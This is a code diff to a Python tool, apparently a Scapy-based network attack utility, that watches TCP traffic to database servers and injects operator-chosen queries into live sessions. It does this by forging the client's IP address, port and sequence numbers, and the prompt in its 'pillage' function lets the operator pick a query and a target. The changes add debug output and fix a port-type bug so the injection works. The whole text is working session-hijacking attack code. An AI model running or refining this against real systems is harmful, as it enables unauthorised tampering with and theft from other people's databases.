@@ -197,22 +197,34 @@ class Parse(threading.Thread):
         except:
             return
 
-        #self.printLn('[*] pkt payload:\t%s'%self.readable(str(pkt[TCP].payload).encode('hex')))
-
         c  = self.getConn(pkt)
 
         if not queries.empty():
             self.inject.append(queries.get())
 
-        if c:
+        if c and c.db != UNKNOWN:
             for i in self.inject:
+                self.printLn("[1] %s %s %s %s %s %s"%(c.db.ip,i[1],c.db.port,i[2],pkt[TCP].sport,pkt[TCP].flags))
                 if c.db.ip == i[1] and c.db.port == i[2] and pkt[TCP].sport == i[2] and pkt[TCP].flags == 24: #make sure injecting after db response and it isn't a fragged response
+                    self.printLn("[2] attempting injection")
                     #self.printLn(databaseList[c.db.dbType].encodeQuery(i[0]).encode('hex'))
                     #sendp(Ether(dst=pkt[Ether].src,src=pkt[Ether].dst)/IP(dst=i[1],src=c.cip)/TCP(sport=c.cport,dport=i[2],flags=16,seq=c.nextcseq,ack=pkt[TCP].seq+len(pkt[TCP].payload)))
                     sendp(Ether(dst=pkt[Ether].src,src=pkt[Ether].dst)/IP(dst=i[1],src=c.cip)/TCP(sport=c.cport,dport=i[2],flags=24,seq=c.nextcseq,ack=pkt[TCP].seq+len(pkt[TCP].payload))/databaseList[c.db.dbType].encodeQuery(i[0]))
                     self.inject.remove(i)
+                else:
+                    if c.db.ip == i[1]:
+                        self.printLn("[3] passed")
+                    if c.db.port == i[2]:
+                        self.printLn("[4] passed")
+                    if pkt[TCP].sport == i[2]:
+                        self.printLn("[5] passed")
+                    if pkt[TCP].flags == 24:
+                        self.printLn("[6] passed")
 
         db = self.isKnownDB(pkt)
+        
+        if c and c.db == UNKNOWN:
+            c.db = db
 
         if c and pkt[TCP].flags == 17: #FIN/ACK pkt, remove conn
             self.delConn(c)
@@ -230,12 +242,12 @@ class Parse(threading.Thread):
             return
 
         if not c: #check if conn is being made to a known DB
-            db = self.isKnownDB(pkt)
+            #db = self.isKnownDB(pkt)
             if db:
-                self.printLn("[*] connecting to known db")
+                #self.printLn("[*] connecting to known db")
                 c = self.addConn(pkt,db)
-            else:
-                self.printLn("[*] connecting to unknown server")
+            #else:
+                #self.printLn("[*] connecting to unknown server")
 
         ip, port, dbType = None, None, None
 
@@ -398,7 +410,7 @@ def pillage():
     print('[*] Run "%s" against %s:%s? [y/n]'%(query,ip,port))
     ans = raw_input("> ")
     if ans == 'y' or ans == 'Y':
-        queries.put([query,ip,port])
+        queries.put([query,ip,int(port)])
         print('[*] Query will run as soon as possible')
     else:
         print('[*] Cancelling...')
